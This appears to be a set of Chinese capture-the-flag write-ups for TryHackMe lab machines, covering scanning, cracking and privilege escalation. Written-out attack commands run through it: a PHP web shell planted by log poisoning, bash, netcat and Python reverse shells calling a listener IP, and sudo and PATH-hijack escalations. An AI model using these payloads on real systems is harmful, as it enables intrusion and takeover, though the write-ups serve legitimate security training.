110.49.169.12721FTP10.49.169.127:21Vsftpd 3.0.30
210.49.169.12780HTTPhttp://10.49.169.127:80Apache2 Ubuntu Default Page: It worksApache-HTTP-Server-Ubuntu, Apache2Debian默认页, apache2-ubuntu默认页面, Apache/2.4.18 (Ubuntu), Apache2 默认页, Apache-Web-Server200
310.49.169.1272222SSH10.49.169.127:2222OpenSSH 7.2p2 Ubuntu 4ubuntu2.80

访问网站是个默认页面，目录扫描得到 /simple

使用 cmsms，版本是 2.2.8

谷歌搜索该版本存在 sql 注入漏洞，并找到相关利用脚本 https://www.exploit-db.com/exploits/46635

运行得到用户名和密码，对密码进行 md5 解码，得到

secret

┌──(root㉿kali)-[~/桌面]└─# python2 poc.py -u http://10.49.169.127/simple[+] Salt for password found: 1dac0d92e9fa6bb2[+] Username found: mitch[+] Email found: admin@admin.com[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96

ftp 可以匿名登录，下载里面的文件

意思是密码很弱且用了相同的密码

ftp> ls -al200 PORT command successful. Consider using PASV.150 Here comes the directory listing.drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 .drwxr-xr-x    3 ftp      ftp          4096 Aug 17  2019 ..-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt┌──(root㉿kali)-[~/桌面]└─# cat ForMitch.txt                                                              Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!

利用脚本得到的账号密码登录 ssh，且指定端口 2222 

┌──(root㉿kali)-[~/桌面]└─# ssh mitch@10.49.169.127 -p 2222mitch@10.49.169.127's password: Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190$ iduid=1001(mitch) gid=1001(mitch) groups=1001(mitch)

sudo -l 得到命令 vim

$ sudo -lUser mitch may run the following commands on Machine:    (root) NOPASSWD: /usr/bin/vim

直接提权

$ sudo vim -c ':!/bin/bash'root@Machine:~# iduid=0(root) gid=0(root) groups=0(root)
entry.summary:
Simple CTF

Beginner level ctf

</

entry.title: TryHackMe_Lian_Yu
entry.content:
Lian_Yu

A beginner level security challenge

端口扫描

序号Host地址端口协议Uri地址标题Banner状态码
110.49.183.8722SSH10.49.183.87:22OpenSSH 6.7p1 Debian 5+deb8u80
210.49.183.8721FTP10.49.183.87:21Vsftpd 3.0.20
310.49.183.8780HTTPhttp://10.49.183.87:80PurgatoryApache-HTTP-Server, Apache-Web-Server200

访问网站，没什么信息，开始目录扫描，得到地址 /island，访问得到了了一个暗号

vigilante

─(root㉿kali)-[~]└─# curl "http://10.49.183.87/island/"<!DOCTYPE html><html><body><style></style><h1> Ohhh Noo, Don't Talk............... </h1><p> I wasn't Expecting You at this Moment. I will meet you there </p><!-- go!go!go! --><p>You should find a way to <b> Lian_Yu</b> as we are planed. The Code Word is: </p><h2 style="color:white"> vigilante</style></h2></body></html>

继续在该目录下扫描，得到地址 /2100，访问得到一个后缀 .ticket

┌──(root㉿kali)-[~]└─# curl "http://10.49.183.87/island/2100/"                                                   <!DOCTYPE html><html><body><h1 align=center>How Oliver Queen finds his way to Lian_Yu?</h1><p align=center ><iframe width="640" height="480" src="https://www.youtube.com/embed/X8ZiFuW41yY"></iframe> <p><!-- you can avail your .ticket here but how?   --></header></body></html>

继续扫描，添加后缀 .ticket，得到地址 /green_arrow.ticket

┌──(root㉿kali)-[~/桌面]└─# ffuf -u http://10.49.183.87/island/2100/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .ticket#.ticket                [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 132ms]green_arrow.ticket      [Status: 200, Size: 71, Words: 10, Lines: 7, Duration: 121ms]

访问该地址得到一个密码

RTy8yhBQdscX

┌──(root㉿kali)-[~]└─# curl "http://10.49.183.87/island/2100/green_arrow.ticket" This is just a token to get into Queen's Gambit(Ship)RTy8yhBQdscX

一开始使用该密码登录失败，那么有可能时使用了某种编码

用工具一键解码，最后 base58 解码成功得到密码

!#th3h00d

登录 ftp，并下载文件

ftp> ls -al200 PORT command successful. Consider using PASV.150 Here comes the directory listing.drwxr-xr-x    2 1001     1001         4096 May 05  2020 .drwxr-xr-x    4 0        0            4096 May 01  2020 ..-rw-------    1 1001     1001           44 May 01  2020 .bash_history-rw-r--r--    1 1001     1001          220 May 01  2020 .bash_logout-rw-r--r--    1 1001     1001         3515 May 01  2020 .bashrc-rw-r--r--    1 0        0            2483 May 01  2020 .other_user-rw-r--r--    1 1001     1001          675 May 01  2020 .profile-rw-r--r--    1 0        0          511720 May 01  2020 Leave_me_alone.png-rw-r--r--    1 0        0          549924 May 05  2020 Queen's_Gambit.png-rw-r--r--    1 0        0          191026 May 01  2020 aa.jpg226 Directory send OK.ftp: 679 bytes received in 0.02Seconds 30.86Kbytes/sec.

其中 Leave_me_alone.png，文件头损毁，修复文件得到密码

password

aa.jpg 使用了隐写术，用刚才得到的密码解密得到 ss.zip

┌──(root㉿kali)-[~/桌面]└─# steghide info aa.jpg"aa.jpg":  format: jpeg  capacity: 11.0 KBTry to get information about embedded data ? (y/n) yEnter passphrase:   embedded file "ss.zip":    size: 596.0 Byte    encrypted: rijndael-128, cbc    compressed: yes                                                                                                                                   ┌──(root㉿kali)-[~/桌面]└─# steghide --extract -sf aa.jpg     Enter passphrase: wrote extracted data to "ss.zip".

解压，在 shado 文件里得到密码

M3tahuman

┌──(root㉿kali)-[~/桌面]└─# unzip ss.zipArchive:  ss.zip  inflating: passwd.txt                inflating: shado                                    ┌──(root㉿kali)-[~/桌面]└─# cat passwd.txt                                                                This is your visa to Land on Lian_Yu # Just for Fun ***a small Note about itHaving spent years on the island, Oliver learned how to be resourceful and set booby traps all over the island in the common event he ran into dangerouspeople. The island is also home to many animals, including pheasants,wild pigs and wolves.                     ┌──(root㉿kali)-[~/桌面]└─# cat shado       M3tahuman

一开始使用 vigilante:M3tahuman 登录 ssh 失败，并且改密码也无法解码

后面继续查看 ftp，在里面发现了另外一个用户 slade

ftp> cd /home250 Directory successfully changed.ftp> ls -al200 PORT command successful. Consider using PASV.150 Here comes the directory listing.drwxr-xr-x    4 0        0            4096 May 01  2020 .drwxr-xr-x   23 0        0            4096 May 01  2020 ..drwx------    2 1000     1000         4096 May 01  2020 sladedrwxr-xr-x    2 1001     1001         4096 May 05  2020 vigilante226 Directory send OK.ftp: 252 bytes received in 0.01Seconds 28.00Kbytes/sec.

登录 slade 成功

┌──(root㉿kali)-[~/桌面]└─# ssh slade@10.49.183.87slade@10.49.183.87's password: slade@LianYu:~$ iduid=1000(slade) gid=1000(slade) groups=1000(slade),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),115(bluetooth)

执行 sudo -l 得到命令 /usr/bin/pkexec

slade@LianYu:~$ sudo -l[sudo] password for slade: Matching Defaults entries for slade on LianYu:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/binUser slade may run the following commands on LianYu:    (root) PASSWD: /usr/bin/pkexec

直接提权

slade@LianYu:~$ sudo pkexec /bin/bashroot@LianYu:~# iduid=0(root) gid=0(root) groups=0(root)root@LianYu:~# ls -altotal 28drwx------  3 root root 4096 May  1  2020 .drwxr-xr-x 23 root root 4096 May  1  2020 ..-rw-------  1 root root   22 May  1  2020 .bash_history-rw-r--r--  1 root root  570 Jan 31  2010 .bashrcdrwx------  2 root root 4096 May  1  2020 .gnupg-rw-r--r--  1 root root  140 Nov 19  2007 .profile-rw-r--r--  1 root root  340 May  1  2020 root.txtroot@LianYu:~# cat root.txt                          Mission accomplishedYou are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}                                                                              --DEATHSTROKELet me know your comments about this machine :)I will be available @twitter @User6825
entry.summary:
Lian_Yu

A beginner level security challenge</

entry.title: TryHackMe_Break Out The Cage
entry.content:
Break Out The Cage

Help Cage bring back his acting career and investigate the nefarious goings on of his agent!

端口扫描

序号Host地址端口协议Uri地址标题Banner状态码
110.49.168.16521FTP10.49.168.165:21Vsftpd 3.0.30
210.49.168.16580HTTPhttp://10.49.168.165:80Nicholas Cage StoriesApache/2.4.29 (Ubuntu), Apache-HTTP-Server/2.4.29, Apache-Web-Server200
310.49.168.16522SSH10.49.168.165:22OpenSSH 7.6p1 Ubuntu 4ubuntu0.30

ftp 匿名登录，并下载 dad_tasks

PS C:\Users\25189\Desktop> ftp 10.49.168.165Connected to 10.49.168.165.220 (vsFTPd 3.0.3)200 Always in UTF8 mode.User (10.49.168.165:(none)): anonymous331 Please specify the password.Password:230 Login successful.ftp> ls -al200 PORT command successful. Consider using PASV.150 Here comes the directory listing.drwxr-xr-x    2 0        0            4096 May 25  2020 .drwxr-xr-x    2 0        0            4096 May 25  2020 ..-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks226 Directory send OK.ftp: 189 bytes received in 0.01Seconds 31.50Kbytes/sec.ftp> get dad_tasks200 PORT command successful. Consider using PASV.150 Opening BINARY mode data connection for dad_tasks (396 bytes).226 Transfer complete.ftp: 396 bytes received in 0.00Seconds 396000.00Kbytes/sec.

解码得到一串看不懂的字符，尝试凯撒以及 rot类型均无果

┌──(root㉿kali)-[~/桌面]└─# cat dad_tasks                                                                                                                                    ┌──(root㉿kali)-[~/桌面]└─# echo "" | base64 -dQapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!Sfw. Kajnmb xsi owuowgeFaz. Tml fkfr qgseik ag oqeibxEljwx. Xil bqi aiklbywqeRsfv. Zwel vvm imel sumebt lqwdsfkYejr. Tqenl Vsw svnt "urqsjetpwbn einyjamu" wf.Iz glww A ykftef.... Qjhsvbouuoexcmvwkwwatfllxughhbbcmydizwlkbsidiuscwl

一开始目录扫描也没有用信息，然后就卡在这里了

看 wp 才知道我是有一个目录 /auditions 没扫出来，这个地址不在 common.txt 里面

访问该地址可以下载一个 mp3 文件，该文件有一段杂音，放入 Sonic Visualiser 查看频谱图

损坏的地方有一段文字，看了许久有点像 namelessTWO，应该是一个密钥

问 ai 是维尼吉亚密码，解码后得到密码

Mydadisghostrideraintthatcoolnocausehesonfirejokes

使用得到的密码登录 weston 账号

┌──(root㉿kali)-[~/桌面]└─# ssh weston@10.49.168.165weston@10.49.168.165's password: Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)Last login: Tue May 26 10:58:20 2020 from 192.168.247.1weston@national-treasure:~$ iduid=1001(weston) gid=1001(weston) groups=1001(weston),1000(cage)

sudo -l 得到 /usr/bin/bees

查看内容是广播一段信息，但是没有对该命令的修改权限以及 wall 使用的是绝对路径也无法劫持

weston@national-treasure:~$ sudo -lMatching Defaults entries for weston on national-treasure:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser weston may run the following commands on national-treasure:    (root) /usr/bin/beesweston@national-treasure:~$ cat /usr/bin/bees#!/bin/bashwall "AHHHHHHH THEEEEE BEEEEESSSS!!!!!!!!"weston@national-treasure:~$ ls -al /usr/bin/bees-rwxr-xr-x 1 root root 56 May 25  2020 /usr/bin/bees

这是突然出现了一段来自 cage 用户的广播信息

Broadcast message from cage@national-treasure (somewhere) (Sat May 16 04:45:01 What’s in the bag? A shark or something? — The Wicker Man

查看该用户可执行的文件

weston@national-treasure:~$ find / -group cage 2>/dev/null/home/cage/opt/.dads_scripts/opt/.dads_scripts/spread_the_quotes.py/opt/.dads_scripts/.files/opt/.dads_scripts/.files/.quotes

该脚本文件从 .quotes 文件中截取一段，然后通过 wall 命令进行广播

这其中使用了 os.system，而且没有对字符串进行任何处理

weston@national-treasure:~$ ls -al /opt/.dads_scripts/spread_the_quotes.py-rwxr--r-- 1 cage cage 255 May 26  2020 /opt/.dads_scripts/spread_the_quotes.pyweston@national-treasure:~$ cat /opt/.dads_scripts/spread_the_quotes.py#!/usr/bin/env python#Copyright Weston 2k20 (Dad couldnt write this with all the time in the world!)import osimport randomlines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()quote = random.choice(lines)os.system("wall " + quote)

但是我们没有对 .quotes 文件修改的权限

weston@national-treasure:~$ ls -al /opt/.dads_scripts/.files/.quotes-rwxrw---- 1 cage cage 4204 May 16 05:04 /opt/.dads_scripts/.files/.quotes

但是看了 wp，很奇怪，明明没有权限，为什么可以修改文件？

那就将反弹命令写入文件，并且覆盖里面之前所有的内容，这样能够保证一定会选到反弹命令

weston@national-treasure:~$ echo '$(bash -c "bash -i >& /dev/tcp/192.168.206.169/4444 0>&1")' > /opt/.dads_scripts/.files/.quotes

本机监听

┌──(root㉿kali)-[~]└─# nc -lvnp 4444listening on [any] 4444 ...connect to [192.168.80.128] from (UNKNOWN) [192.168.80.1] 6670bash: cannot set terminal process group (1908): Inappropriate ioctl for devicebash: no job control in this shellcage@national-treasure:~$ ididuid=1000(cage) gid=1000(cage) groups=1000(cage),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd)

找到 flag

cage@national-treasure:~$ cat Super_Duper_Checklistcat Super_Duper_Checklist1 - Increase acting lesson budget by at least 30%2 - Get Weston to stop wearing eye-liner3 - Get a new pet octopus4 - Try and keep current wife5 - Figure out why Weston has this etched into his desk: THM{M37AL_0R_P3N_T35T1NG}

在 email_backup 目录下有三个文件

其中 email_2 出现了 root 的名字

email_3 则提到了纸条上的文字 haiinspsyanileph，以及后面反复强调的脸 face

cage@national-treasure:~/email_backup$ cat email_2cat email_2...On a much lighter note thank you for helping me set up my home server, Weston helped too, butnot overally greatly. I gave him some smaller jobs. Whats your username on here? Root?...cage@national-treasure:~/email_backup$ cat email_3cat email_3...Buddy, Sean left a note on his desk with some really strange writing on it...The note said:haiinspsyanilephThe guy also seems obsessed with my face lately. He came him wearing a mask of my face......

结合之前的解密，猜测这也是一个维尼吉亚加密

密文：haiinspsyanileph

密钥： face

解密得到

cageisnotalegend

使用改密码登录 root，首先需要用 script 创建一个伪终端

cage@national-treasure:~/email_backup$ script /dev/nullscript /dev/nullScript started, file is /dev/null$ su rootsu rootPassword: cageisnotalegendroot@national-treasure:/home/cage/email_backup# ididuid=0(root) gid=0(root) groups=0(root)

在 ~/email_backup/email_2 里面找到 flag

root@national-treasure:~/email_backup# cat email_2cat email_2From - master@ActorsGuild.comTo - SeanArcher@BigManAgents.comDear SeanI'm very pleased to here that Sean, you are a good disciple. Your power over him has becomestrong... so strong that I feel the power to promote you from disciple to crony. I hope youdon't abuse your new found strength. To ascend yourself to this level please use this code:THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}Thank youSean Archer
entry.summary: Break Out The Cage

entry.title: TryHackMe_tomghost
entry.content:
Archangel

Boot2root, Web exploitation, Privilege escalation, LFI

端口扫描

序号Host地址端口协议Uri地址标题Banner状态码
110.48.128.22422SSH10.48.128.224:22OpenSSH 7.6p1 Ubuntu 4ubuntu0.30
210.48.128.22480HTTPhttp://10.48.128.224:80WavefireApache-Web-Server, Apache/2.4.29 (Ubuntu), Apache-HTTP-Server/2.4.29, jQuery200

在网站首页邮箱处找到一个 hostname

目录扫描

┌──(root㉿kali)-[~/桌面]└─# gobuster dir -u http://mafialive.thm -w /usr/share/wordlists/dirb/common.txt     ===============================================================Gobuster v3.8.2by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)===============================================================index.html           (Status: 200) [Size: 59]robots.txt           (Status: 200) [Size: 34]server-status        (Status: 403) [Size: 278]

访问 /robots.txt

┌──(root㉿kali)-[~/桌面]└─# curl "http://mafialive.thm/robots.txt"User-agent: *Disallow: /test.php

访问 /test.php，有一个按钮

┌──(root㉿kali)-[~/桌面]└─# curl "http://mafialive.thm/test.php"<!DOCTYPE HTML><html><head>    <title>INCLUDE</title>    <h1>Test Page. Not to be Deployed</h1>     </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>            </div></body></html>

浏览器访问并点击按钮

注意到参数 view 后面跟的是目录，猜测存在目录遍历漏洞

将 mrrobot.php 修改为 robots.txt，返回结果里面输出了该路径的内容

──(root㉿kali)-[~/桌面]└─# curl "http://mafialive.thm/test.php?view=/var/www/html/development_testing/robots.txt"<!DOCTYPE HTML><html><head>    <title>INCLUDE</title>    <h1>Test Page. Not to be Deployed</h1>    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>        User-agent: *Disallow: /test.php    </div></body></html>

修改为 test.php 无结果

root㉿kali)-[~/桌面]└─# curl "http://mafialive.thm/test.php?view=/var/www/html/development_testing/test.php"<!DOCTYPE HTML><html><head>    <title>INCLUDE</title>    <h1>Test Page. Not to be Deployed</h1>    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>

用 base64 去解析，返回了文件的编码结果

┌──(root㉿kali)-[~/桌面]└─# curl "http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php"<!DOCTYPE HTML><html><head>    <title>INCLUDE</title>    <h1>Test Page. Not to be Deployed</h1>     </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>        </div></body></html>

解码

限制条件

不能包含 ../..（防止路径向上跳转）

必须包含 /var/www/html/development_testing（强制从该目录开始）

虽然不能有 ../..，但是 .. 本身是允许的，因此可以用双斜杠 ..//.. 绕过

<!DOCTYPE HTML><html><head>    <title>INCLUDE</title>    <h1>Test Page. Not to be Deployed</h1>    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>        <?php            //FLAG: thm{explo1t1ng_lf1}            function containsStr($str, $substr) {                return strpos($str, $substr) !== false;            }            if(isset($_GET["view"])){            if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {                include $_GET['view'];            }else{                echo 'Sorry, Thats not allowed';            }        }        ?>    </div></body></html>

尝试目录遍历，成功返回了 /etc/passwd 的内容

┌──(root㉿kali)-[~/桌面]└─# curl "http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//.//..//..//..//../etc/passwd"<!DOCTYPE HTML><html><head>    <title>INCLUDE</title>    <h1>Test Page. Not to be Deployed</h1>     </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>        root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologin...</body></html>

尝试遍历阿帕奇的日志文件，也是成功

view=/var/www/html/development_testing//..//..//..//..//..//../var/log/apache2/access.log

修改 User-Agent 参数来污染日志文件

curl -A "<?php system(\$_GET['cmd']); ?>" "http://mafialive.thm/test.php?view=/var/www/html/development_testing//..//..//..//..//..//../var/log/apache2/access.log"

然后再执行 cmd 命令，将结果输出到 log.txt

curl "http://mafialive.thm/test.phpview=/var/www/html/development_testing//..//..//..//..//..//../var/log/apache2/access.log&cmd=id" -o log.txt

查看日志文件，在最后找到了 id 的执行结果

那就直接反弹 shell

-A "<?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.206.169 4444 >/tmp/f') ?>"

成功反弹

┌──(root㉿kali)-[~/桌面]└─# nc -lvnp 4444listening on [any] 4444 ...connect to [192.168.80.128] from (UNKNOWN) [192.168.80.1] 10299/bin/sh: 0: can't access tty; job control turned off$ iduid=33(www-data) gid=33(www-data) groups=33(www-data)$ ls /homearchangel$ cd /home/archangel$ ls -altotal 44drwxr-xr-x 6 archangel archangel 4096 Nov 20  2020 .drwxr-xr-x 3 root      root      4096 Nov 18  2020 ..-rw-r--r-- 1 archangel archangel  220 Nov 18  2020 .bash_logout-rw-r--r-- 1 archangel archangel 3771 Nov 18  2020 .bashrcdrwx------ 2 archangel archangel 4096 Nov 18  2020 .cachedrwxrwxr-x 3 archangel archangel 4096 Nov 18  2020 .local-rw-r--r-- 1 archangel archangel  807 Nov 18  2020 .profile-rw-rw-r-- 1 archangel archangel   66 Nov 18  2020 .selected_editordrwxr-xr-x 2 archangel archangel 4096 Nov 18  2020 myfilesdrwxrwx--- 2 archangel archangel 4096 Nov 19  2020 secret-rw-r--r-- 1 archangel archangel   26 Nov 19  2020 user.txt$ cat user.txtthm{lf1_t0_rc3_1s_tr1cky}

查看用户 archangel 的可执行文件，有一个 helloworld.sh

而且 www-data 用户有对该文件的修改权限

$ find / -user archangel -type f 2>/dev/null                /opt/helloworld.sh/home/archangel/.selected_editor/home/archangel/.profile/home/archangel/user.txt/home/archangel/.bash_logout/home/archangel/.bashrc$ cat /opt/helloworld.sh#!/bin/bashecho "hello world" >> /opt/backupfiles/helloworld.txt$ ls -al /opt/helloworld.sh-rwxrwxrwx 1 archangel archangel 66 Nov 20  2020 /opt/helloworld.sh

查看定时任务，发现该文件每分钟会以 archangel 权限执行一次

$ cat /etc/crontabSHELL=/bin/shPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin# m h dom mon dow user  command*/1 *   * * *   archangel /opt/helloworld.sh

修改该文件，将反弹命令写进去

cat > helloworld.sh << 'EOF'#!/usr/bin/python3import socket,subprocess,oss=socket.socket()s.connect(("192.168.206.169",4442))os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)subprocess.call(["/bin/bash","-i"])EOF

再开一个窗口进行监听，等一会就成功拿到权限

在 secret 找到第二个 flag，同时还有一个 SUID 二进制文件

archangel@ubuntu:~$ cd secretcd secretarchangel@ubuntu:~/secret$ ls -alls -altotal 32drwxrwx--- 2 archangel archangel  4096 Nov 19  2020 .drwxr-xr-x 6 archangel archangel  4096 Nov 20  2020 ..-rwsr-xr-x 1 root      root      16904 Nov 18  2020 backup-rw-r--r-- 1 root      root         49 Nov 19  2020 user2.txtarchangel@ubuntu:~/secret$ cat user2.txtcat user2.txtthm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}

将该文件下载到本地分析

该文件会执行 cp 命令

在 /tmp 目录下创建一个假的 cp 命令，并赋予 777 权限

修改 PATH 环境变量，让系统优先使用我们伪造的 cp

archangel@ubuntu:~$ cd /tmparchangel@ubuntu:/tmp$ echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/cparchangel@ubuntu:/tmp$ chmod +x /tmp/cparchangel@ubuntu:/tmp$ export PATH=/tmp:$PATH

执行 ./backup，成功提权

archangel@ubuntu:~/secret$ ./backup./backupiduid=0(root) gid=0(root) groups=0(root),1001(archangel)cat /root/root.txtthm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}
entry.summary:
Archangel

Boot2root, Web exploitation,

entry.title: TryHackMe_tomghost
entry.content:
tomghost

Identify recent vulnerabilities to try exploit the system or read files that you should not have access to.

端口扫描

序号Host地址端口协议Uri地址标题Banner状态码
110.48.161.2222SSH10.48.161.22:22OpenSSH 7.2p2 Ubuntu 4ubuntu2.80
210.48.161.2253DNS10.48.161.22:53UnKnown0
310.48.161.228080HTTPhttp://10.48.161.22:8080Apache Tomcat/9.0.30lexmark, Apache-Tomcat, Tomcat-Login, Tomcat默认页面200
410.48.161.228009AJP1310.48.161.22:8009Apache Jserv i0

访问 8080 是一个 tomcat 默认页面，目录扫描得到 /manager，访问显示无权浏览

那就搜索 AJP 相关漏洞，并下载 48143.py

┌──(root㉿kali)-[~/桌面]└─# searchsploit AJP                     ------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title                                                                                   |  Path------------------------------------------------------------------------------------------------- ---------------------------------AjPortal2Php - 'PagePrefix' Remote File Inclusion                                                | php/webapps/3752.txtApache Tomcat - AJP 'Ghostcat File Read/Inclusion                                                | multiple/webapps/48143.pyApache Tomcat - AJP 'Ghostcat' File Read/Inclusion (Metasploit)                                  | multiple/webapps/49039.rb------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No Results                                                                                                                                                                                                                                                               ┌──(root㉿kali)-[~/桌面]└─# cp /usr/share/exploitdb/exploits/multiple/webapps/48143.py .

运行脚本得到一个用户名和密码

skyfuck:8730281lkjlkjdqlksalks

┌──(root㉿kali)-[~/桌面]└─# python2 48143.py                 usage: 48143.py [-h] [-p PORT] [-f FILE] target48143.py: error: too few arguments┌──(root㉿kali)-[~/桌面]└─# python2 48143.py 10.48.161.22Getting resource at ajp13://10.48.161.22:8009/asdf----------------------------<?xml version="1.0" encoding="UTF-8"?><!-- Licensed to the Apache Software Foundation (ASF) under one or more  contributor license agreements.  See the NOTICE file distributed with  this work for additional information regarding copyright ownership.  The ASF licenses this file to You under the Apache License, Version 2.0  (the "License"); you may not use this file except in compliance with  the License.  You may obtain a copy of the License at      http://www.apache.org/licenses/LICENSE-2.0  Unless required by applicable law or agreed to in writing, software  distributed under the License is distributed on an "AS IS" BASIS,  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  See the License for the specific language governing permissions and  limitations under the License.--><web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"  version="4.0"  metadata-complete="true">  <display-name>Welcome to Tomcat</display-name>  <description>     Welcome to GhostCat        skyfuck:8730281lkjlkjdqlksalks  </description></web-app>

使用 ssh 成功登录

┌──(root㉿kali)-[~/桌面]└─# ssh skyfuck@10.48.161.22** WARNING: connection is not using a post-quantum key exchange algorithm.** This session may be vulnerable to "store now, decrypt later" attacks.** The server may need to be upgraded. See https://openssh.com/pq.htmlskyfuck@10.48.161.22's password: Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantageLast login: Fri May 15 02:00:36 2026 from 192.168.206.169skyfuck@ubuntu:~$ iduid=1002(skyfuck) gid=1002(skyfuck) groups=1002(skyfuck)skyfuck@ubuntu:~$ ls -altotal 40drwxr-xr-x 3 skyfuck skyfuck 4096 May 15 02:00 .drwxr-xr-x 4 root    root    4096 Mar 10  2020 ..-rw------- 1 skyfuck skyfuck  136 Mar 10  2020 .bash_history-rw-r--r-- 1 skyfuck skyfuck  220 Mar 10  2020 .bash_logout-rw-r--r-- 1 skyfuck skyfuck 3771 Mar 10  2020 .bashrcdrwx------ 2 skyfuck skyfuck 4096 May 15 02:00 .cache-rw-rw-r-- 1 skyfuck skyfuck  394 Mar 10  2020 credential.pgp-rw-r--r-- 1 skyfuck skyfuck  655 Mar 10  2020 .profile-rw-rw-r-- 1 skyfuck skyfuck 5144 Mar 10  2020 tryhackme.ascskyfuck@ubuntu:~$ find / -name user.txt 2>/dev/null/home/merlin/user.txtskyfuck@ubuntu:~$ cat /home/merlin/user.txtTHM{GhostCat_1s_so_cr4sy}

该目录下还有两个可疑文件

credential.pgp — 可能是加密的凭据文件

tryhackme.asc — PGP 密钥文件

skyfuck@ubuntu:~$ cat tryhackme.asc-----BEGIN PGP PRIVATE KEY BLOCK-----Version: BCPG v1.63lQUBBF5ocmIRDADTwu9RL5uol6+jCnuoK58+PEtPh0Zfdj4+q8z61PL56tz6YxmF...-----END PGP PRIVATE KEY BLOCK-----

将密钥文件下载到本地，先用 gpg2john 提取哈希，再用 john 破解得到密码

alexandru

┌──(root㉿kali)-[~/桌面]└─# gpg2john tryhackme.asc > hash.txtFile tryhackme.asc                                                                                                                                   ┌──(root㉿kali)-[~/桌面]└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txtUsing default input encoding: UTF-8Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])Cost 1 (s2k-count) is 65536 for all loaded hashesCost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashesCost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashesWill run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusalexandru        (tryhackme)     1g 0:00:00:00 DONE (2026-05-15 17:24) 12.50g/s 13400p/s 13400c/s 13400C/s theresa..alexandruUse the "--show" option to display all of the cracked passwords reliablySession completed.

用刚得到的密码解密 credential.pgp，得到 merlin 的密码

merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j

skyfuck@ubuntu:~$ gpg --decrypt credential.pgpYou need a passphrase to unlock the secret key foruser: "tryhackme <stuxnet@tryhackme.com>"1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)gpg: gpg-agent is not available in this sessiongpg: WARNING: cipher algorithm CAST5 not found in recipient preferencesgpg: encrypted with 1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11      "tryhackme <stuxnet@tryhackme.com>"merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j

su 直接切换账户，sudo -l 发现可以无密码 root 执行 /usr/bin/zip

zip 命令有一个 -T 参数，可以用于测试压缩包的完整性，并且可以通过 --unzip-command 选项执行任意命令。

